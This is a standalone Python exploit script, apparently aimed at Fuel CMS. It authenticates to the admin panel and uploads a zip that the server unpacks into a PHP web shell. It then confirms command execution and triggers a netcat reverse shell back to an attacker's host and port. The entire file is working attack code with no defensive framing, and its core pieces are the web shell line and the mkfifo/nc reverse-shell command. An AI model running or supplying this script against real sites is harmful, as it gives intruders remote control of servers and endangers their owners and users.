#!/usr/bin/env python3

import urllib.parse
import requests
import argparse
import zipfile
import uuid
import sys


def authenticate(username, password, schema, target, cms_dir):
    print(f'[*] Testing creds: Username {username}, Password {password}')
    session = requests.Session()
    data = {
        'user_name': username,
        'password': password,
        'Login': 'Login',
    }
    try:
        response = session.post(f'{schema}//{target}/{cms_dir}/login', data=data, verify=False)
    except:
        return False
    if response.status_code == 200:
        return session
    return None


def create_payload():
    archive = str(uuid.uuid4()).split('-')[0] + '.zip'
    webshell = str(uuid.uuid4()).split('-')[0] + '.php'
    with open(webshell, 'w') as f:
        f.write('<?php echo shell_exec($_GET["cmd"]); ?>\n')
    with zipfile.ZipFile(archive, 'w') as z:
        z.write(webshell)
    return archive, webshell


def upload_payload(session, schema, target, cms_dir, archive):
    print(f'[*] Uploading zip file {archive}')
    files = {
        '__fuel_selected_tab__': (None, '0'),
        'userfile': open(archive, 'rb'),
        'asset_folder': (None, 'images'),
        'overwrite': (None, '1'),
        'unzip': (None, '1'),
    }
    try:
        session.post(f'{schema}//{target}/{cms_dir}/assets/create/',  files=files, verify=False)
    except:
        return False
    return True


def was_upload_sucessful(schema, target, cms_dir, webshell):
    whoami = None
    try:
        whoami = requests.get(f'{schema}//{target}/assets/images/{webshell}?cmd=whoami', verify=False).text
    except:
        return False
    if whoami:
        print(f'\nGot a webshell as user: {whoami.strip()}')
        print(f'go to --> {schema}//{target}/assets/images/{webshell}?cmd=whoami\n')
        return True
    return False


def get_reverse_shell(schema, target, cms_dir, webshell, lhost, lport):
    print(f'[*] Sending reverse shell to {lhost}:{lport}')
    cmd = f'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'
    encoded_cmd = urllib.parse.quote(cmd, safe="")
    try:
        requests.get(f'{schema}//{target}/assets/images/{webshell}?cmd={encoded_cmd}', verify=False)
    except:
        return False
    return True


def main(schema, target, cms_dir, username, password, lhost, lport):
    session = authenticate(username, password, schema, target, cms_dir)
    archive , webshell = create_payload()
    if session is None:
        print('[Err] Credentials provided did not work. Aborting!')
        sys.exit(2)
    upload_payload(session, schema, target, cms_dir, archive)
    success = was_upload_sucessful(schema, target, cms_dir, webshell)
    if success == False:
        print('[Err] We could not upload php file. Aborting')
        sys.exit(1)
    get_reverse_shell(schema, target, cms_dir, webshell, lhost, lport)



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--username', type=str, required=True)
    parser.add_argument('--password', type=str, required=True)
    parser.add_argument('--lhost', type=str, required=True)
    parser.add_argument('--lport', type=int, required=True)
    parser.add_argument('--url', type=str, required=True)
    args = parser.parse_args()
    url_parts = args.url.split('/')
    schema, target, cms_dir = url_parts[0], url_parts[2], url_parts[3]
    main(schema, target, cms_dir, args.username, args.password, args.lhost, args.lport)

